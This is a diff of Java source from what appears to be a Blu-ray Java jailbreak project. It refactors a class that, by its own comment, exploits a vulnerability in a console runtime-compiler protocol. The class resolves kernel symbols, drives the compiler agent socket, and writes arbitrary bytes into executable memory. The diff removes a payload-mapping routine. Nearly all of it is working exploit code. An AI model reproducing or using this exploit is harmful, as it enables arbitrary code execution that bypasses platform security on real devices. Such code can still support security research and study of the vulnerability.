@@ -5,37 +5,20 @@
  * of the MIT license.  See the LICENSE file for details.
  */
 
-package com.bdjb;
+package com.bdjb.jit;
 
 import com.bdjb.api.API;
 import com.bdjb.api.Buffer;
 import com.bdjb.api.Int8;
 import com.bdjb.api.Text;
-import java.io.RandomAccessFile;
 
 /**
- * JIT class that exploits a vulnerability in the runtime-compiler protocol to map payloads to
+ * JIT implementation that exploits a vulnerability in the runtime-compiler protocol to copy data to
  * executable memory.
  */
-public final class JIT {
-  public static final int PROT_NONE = 0x0;
-  public static final int PROT_READ = 0x1;
-  public static final int PROT_WRITE = 0x2;
-  public static final int PROT_EXEC = 0x4;
-
-  public static final int MAP_SHARED = 0x1;
-  public static final int MAP_PRIVATE = 0x2;
-  public static final int MAP_FIXED = 0x10;
-  public static final int MAP_ANONYMOUS = 0x1000;
-
-  public static final long MAP_FAILED = -1;
-
+public final class JitCompilerReceiverImpl extends AbstractJit {
   // We actually have 32MB of code memory, but reserve 8MB for Java JIT.
   public static final int MAX_CODE_SIZE = 24 * 1024 * 1024;
-  public static final int PAGE_SIZE = 0x4000;
-  public static final int ALIGNMENT = 0x100000;
-
-  private static final int CHUNK_SIZE = 0x30;
 
   private static final int SCE_KERNEL_MODULE_INFO_SIZE = 0x160;
 
@@ -51,33 +34,28 @@ public final class JIT {
     (byte) 0x4C, (byte) 0x8B, (byte) 0x70, (byte) 0x08, (byte) 0x41
   };
 
+  private static final int BDJ_MODULE_HANDLE = 0;
+
   private static final String SCE_KERNEL_GET_MODULE_INFO_SYMBOL = "sceKernelGetModuleInfo";
-  private static final String MMAP_SYMBOL = "mmap";
   private static final String WRITE_SYMBOL = "write";
   private static final String READ_SYMBOL = "read";
 
-  private static final int BDJ_MODULE_HANDLE = 0;
-
-  private static JIT instance;
-
-  private final API api;
+  private static JitCompilerReceiverImpl instance;
 
   private long sceKernelGetModuleInfo;
-  private long mmap;
   private long read;
   private long write;
   private long BufferBlob__create;
 
   private int compilerAgentSocket;
 
-  private JIT() throws Exception {
-    this.api = API.getInstance();
+  private JitCompilerReceiverImpl() {
     this.init();
   }
 
-  public static synchronized JIT getInstance() throws Exception {
+  public static synchronized JitCompilerReceiverImpl getInstance() {
     if (instance == null) {
-      instance = new JIT();
+      instance = new JitCompilerReceiverImpl();
     }
     return instance;
   }
@@ -90,7 +68,6 @@ public final class JIT {
   private void initSymbols() {
     sceKernelGetModuleInfo =
         api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SCE_KERNEL_GET_MODULE_INFO_SYMBOL);
-    mmap = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, MMAP_SYMBOL);
     read = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, READ_SYMBOL);
     write = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, WRITE_SYMBOL);
 
@@ -103,7 +80,7 @@ public final class JIT {
     Buffer modinfo = new Buffer(SCE_KERNEL_MODULE_INFO_SIZE);
     modinfo.fill((byte) 0);
     modinfo.putLong(0x00, SCE_KERNEL_MODULE_INFO_SIZE);
-    if (api.call(sceKernelGetModuleInfo, BDJ_MODULE_HANDLE, modinfo.address()) != 0) {
+    if (sceKernelGetModuleInfo(BDJ_MODULE_HANDLE, modinfo) != 0) {
       throw new InternalError("sceKernelGetModuleInfo failed");
     }
 
@@ -137,16 +114,28 @@ public final class JIT {
         api.read32(compilerAgentSocketOpcode + api.read32(compilerAgentSocketOpcode + 0x3) + 0x7);
   }
 
-  private long align(long x, long align) {
-    return (x + align - 1) & ~(align - 1);
+  int sceKernelGetModuleInfo(int modid, Buffer info) {
+    return (int) api.call(sceKernelGetModuleInfo, modid, info != null ? info.address() : 0);
   }
 
-  public long jitMap(long size, long alignment) {
+  long write(int fd, Buffer buf, long nbytes) {
+    return api.call(write, fd, buf != null ? buf.address() : 0, nbytes);
+  }
+
+  long read(int fd, Buffer buf, long nbytes) {
+    return api.call(read, fd, buf != null ? buf.address() : 0, nbytes);
+  }
+
+  long BufferBlob__create(Text name, int buffer_size) {
+    return api.call(BufferBlob__create, name != null ? name.address() : 0, buffer_size);
+  }
+
+  protected long jitMap(long size, long alignment) {
     if (size >= MAX_CODE_SIZE) {
       throw new IllegalArgumentException("size too big");
     }
-    Text name = new Text("jit");
-    long blob = api.call(BufferBlob__create, name.address(), size + 0x88 + alignment - 1);
+    long blob =
+        BufferBlob__create(new Text("jit"), (int) (align(size + 0x88 + alignment - 1, PAGE_SIZE)));
     if (blob == 0) {
       throw new OutOfMemoryError("BufferBlob__create failed");
     }
@@ -154,80 +143,32 @@ public final class JIT {
     return align(code, alignment);
   }
 
-  public void jitCopy(long dest, byte[] src, long n) {
+  protected void jitCopy(long dest, byte[] src, long n) {
     Buffer req = new Buffer(COMPILER_AGENT_REQUEST_SIZE);
     Int8 resp = new Int8();
 
     byte[] chunk = new byte[CHUNK_SIZE];
 
-    for (long i = 0; i < n; i += CHUNK_SIZE) {
-      api.memset(chunk, 0, CHUNK_SIZE);
+    for (long i = 0; i < n; i += chunk.length) {
+      api.memset(chunk, 0, chunk.length);
 
-      System.arraycopy(src, (int) i, chunk, 0, (int) Math.min(n - i, CHUNK_SIZE));
+      System.arraycopy(src, (int) i, chunk, 0, (int) Math.min(n - i, chunk.length));
 
       req.fill((byte) 0);
       req.put(0x00, chunk);
       req.putLong(0x38, dest + i - 0x28);
-      api.call(write, compilerAgentSocket, req.address(), req.size());
+      if (write(compilerAgentSocket, req, req.size()) != req.size()) {
+        throw new InternalError("write failed");
+      }
 
       resp.set((byte) 0);
-      api.call(read, compilerAgentSocket, resp.address(), resp.size());
+      if (read(compilerAgentSocket, resp, resp.size()) != resp.size()) {
+        throw new InternalError("read failed");
+      }
 
       if (resp.get() != ACK_MAGIC_NUMBER) {
         throw new AssertionError("wrong compiler response");
       }
     }
-  }
-
-  public long mapPayload(String path, long dataSectionOffset) throws Exception {
-    RandomAccessFile file = new RandomAccessFile(path, "r");
-
-    if ((dataSectionOffset & (PAGE_SIZE - 1)) != 0) {
-      throw new IllegalArgumentException("unaligned data section offset");
-    }
-
-    if (dataSectionOffset < 0 || dataSectionOffset > file.length()) {
-      throw new IllegalArgumentException("invalid data section offset");
-    }
-
-    // Allocate JIT memory.
-    long address = jitMap(file.length(), ALIGNMENT);
-
-    byte[] chunk = new byte[CHUNK_SIZE];
-
-    // Copy .text section.
-    for (long i = 0; i < dataSectionOffset; i += CHUNK_SIZE) {
-      api.memset(chunk, 0, CHUNK_SIZE);
-
-      file.seek(i);
-      int read = file.read(chunk, 0, (int) Math.min(dataSectionOffset - i, CHUNK_SIZE));
-
-      jitCopy(address + i, chunk, read);
-    }
-
-    // Map the .data section as RW.
-    if (api.call(
-            mmap,
-            address + dataSectionOffset,
-            align(file.length() - dataSectionOffset, PAGE_SIZE),
-            PROT_READ | PROT_WRITE,
-            MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS,
-            -1,
-            0)
-        == MAP_FAILED) {
-      throw new InternalError("mmap failed");
-    }
-
-    // Copy .data section.
-    for (long i = dataSectionOffset; i < file.length(); i += CHUNK_SIZE) {
-      api.memset(chunk, 0, CHUNK_SIZE);
-
-      file.seek(i);
-      int read = file.read(chunk, 0, (int) Math.min(file.length() - i, CHUNK_SIZE));
-
-      api.memcpy(address + i, chunk, read);
-    }
-
-    return address;
   }
 }
